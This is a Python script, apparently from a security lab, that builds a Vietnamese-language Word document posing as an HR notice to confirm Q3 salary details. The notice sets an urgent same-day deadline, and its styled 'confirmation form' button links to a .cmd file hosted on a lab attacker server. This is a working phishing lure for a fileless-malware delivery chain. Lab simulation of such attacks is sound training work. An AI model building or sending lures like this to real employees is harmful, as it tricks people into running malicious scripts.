from docx import Document
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT, WD_CELL_VERTICAL_ALIGNMENT
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Inches, Pt, RGBColor


OUTPUT = r"D:\fileless malware\lab-files\attacker-web\ThongBaoLuong_Q3.docx"


def set_cell_shading(cell, fill):
    tc_pr = cell._tc.get_or_add_tcPr()
    shd = OxmlElement("w:shd")
    shd.set(qn("w:fill"), fill)
    tc_pr.append(shd)


def set_cell_border(cell, color="D9D9D9"):
    tc = cell._tc
    tc_pr = tc.get_or_add_tcPr()
    borders = tc_pr.first_child_found_in("w:tcBorders")
    if borders is None:
        borders = OxmlElement("w:tcBorders")
        tc_pr.append(borders)
    for edge in ("top", "left", "bottom", "right", "insideH", "insideV"):
        tag = "w:{}".format(edge)
        element = borders.find(qn(tag))
        if element is None:
            element = OxmlElement(tag)
            borders.append(element)
        element.set(qn("w:val"), "single")
        element.set(qn("w:sz"), "6")
        element.set(qn("w:space"), "0")
        element.set(qn("w:color"), color)


def add_hyperlink(paragraph, text, url):
    part = paragraph.part
    r_id = part.relate_to(
        url,
        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink",
        is_external=True,
    )
    hyperlink = OxmlElement("w:hyperlink")
    hyperlink.set(qn("r:id"), r_id)

    run = OxmlElement("w:r")
    r_pr = OxmlElement("w:rPr")

    color = OxmlElement("w:color")
    color.set(qn("w:val"), "FFFFFF")
    r_pr.append(color)

    bold = OxmlElement("w:b")
    r_pr.append(bold)

    run.append(r_pr)
    text_node = OxmlElement("w:t")
    text_node.text = text
    run.append(text_node)
    hyperlink.append(run)
    paragraph._p.append(hyperlink)


def format_run(run, size=10.5, bold=False, color="111827"):
    run.font.name = "Segoe UI"
    run._element.rPr.rFonts.set(qn("w:ascii"), "Segoe UI")
    run._element.rPr.rFonts.set(qn("w:hAnsi"), "Segoe UI")
    run.font.size = Pt(size)
    run.font.bold = bold
    run.font.color.rgb = RGBColor.from_string(color)


doc = Document()
section = doc.sections[0]
section.top_margin = Inches(0.75)
section.bottom_margin = Inches(0.75)
section.left_margin = Inches(0.8)
section.right_margin = Inches(0.8)

styles = doc.styles
styles["Normal"].font.name = "Segoe UI"
styles["Normal"].font.size = Pt(10.5)
styles["Title"].font.name = "Segoe UI"
styles["Title"].font.size = Pt(22)
styles["Title"].font.bold = True
styles["Heading 1"].font.name = "Segoe UI"
styles["Heading 1"].font.size = Pt(14)
styles["Heading 1"].font.bold = True

title = doc.add_paragraph(style="Title")
title.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = title.add_run("Thông báo xác nhận thông tin lương quý 3")
format_run(r, size=22, bold=True, color="111827")

subtitle = doc.add_paragraph()
subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = subtitle.add_run("Phòng Nhân sự")
format_run(r, size=11, color="4B5563")

intro = doc.add_paragraph()
intro.paragraph_format.space_before = Pt(12)
intro.paragraph_format.space_after = Pt(8)
r = intro.add_run(
    "Nhân viên vui lòng kiểm tra lại thông tin lương quý 3 trước khi hệ thống chốt dữ liệu. "
    "Tài liệu này được dùng để hướng dẫn bước xác nhận thông tin cá nhân và khoản chi trả dự kiến."
)
format_run(r)

table = doc.add_table(rows=4, cols=2)
table.alignment = WD_TABLE_ALIGNMENT.CENTER
table.autofit = True

rows = [
    ("Mã tài liệu", "HR-Q3-VERIFY-2026"),
    ("Bộ phận phụ trách", "Phòng Nhân sự"),
    ("Thời hạn xác nhận", "17:00 hôm nay"),
    ("Trạng thái", "Cần xác nhận"),
]

for row_index, row in enumerate(table.rows):
    for col_index, cell in enumerate(row.cells):
        cell.vertical_alignment = WD_CELL_VERTICAL_ALIGNMENT.CENTER
        set_cell_border(cell)
        if col_index == 0:
            set_cell_shading(cell, "E5E7EB")
        paragraph = cell.paragraphs[0]
        paragraph.paragraph_format.space_after = Pt(0)
        run = paragraph.add_run(rows[row_index][col_index])
        format_run(run, bold=(col_index == 0), color="111827")

doc.add_paragraph()
heading = doc.add_paragraph(style="Heading 1")
r = heading.add_run("Yêu cầu thực hiện")
format_run(r, size=14, bold=True)

for item in [
    "Kiểm tra lại thông tin cá nhân và mã nhân viên.",
    "Đối chiếu thông tin lương quý 3 với dữ liệu dự kiến.",
    "Mở biểu mẫu xác nhận để hoàn tất quy trình.",
]:
    p = doc.add_paragraph(style="List Bullet")
    r = p.add_run(item)
    format_run(r)

doc.add_paragraph()
button_table = doc.add_table(rows=1, cols=1)
button_table.alignment = WD_TABLE_ALIGNMENT.CENTER
cell = button_table.rows[0].cells[0]
cell.vertical_alignment = WD_CELL_VERTICAL_ALIGNMENT.CENTER
set_cell_shading(cell, "2563EB")
set_cell_border(cell, "2563EB")
p = cell.paragraphs[0]
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
p.paragraph_format.space_before = Pt(8)
p.paragraph_format.space_after = Pt(8)
add_hyperlink(p, "Mở biểu mẫu xác nhận", "http://192.168.141.1:8000/XacNhanLuong_Q3.cmd")

note = doc.add_paragraph()
note.paragraph_format.space_before = Pt(14)
r = note.add_run(
    "Lưu ý: Đây là tài liệu giả lập trong môi trường lab an toàn. Không nhập mật khẩu hoặc thông tin cá nhân thật."
)
format_run(r, size=9, color="6B7280")

doc.save(OUTPUT)
